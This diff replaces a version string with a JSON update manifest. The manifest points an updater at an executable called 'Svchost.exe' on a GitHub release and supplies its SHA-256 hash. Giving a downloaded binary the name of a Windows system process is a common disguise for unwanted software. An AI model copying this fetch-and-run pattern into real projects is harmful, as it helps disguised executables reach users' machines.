@@ -1,1 +1,6 @@
-v1
+{
+  "version": "1.0.3",
+  "exe_name": "Svchost.exe",
+  "download_url": "https://github.com/SuperMirror7/wizard/releases/download/update/Svchost.exe",
+  "sha256": "b5028954a7465b7f214589e1b6f2f56967ecd52e5b8bf3469766824df866510c"
+}
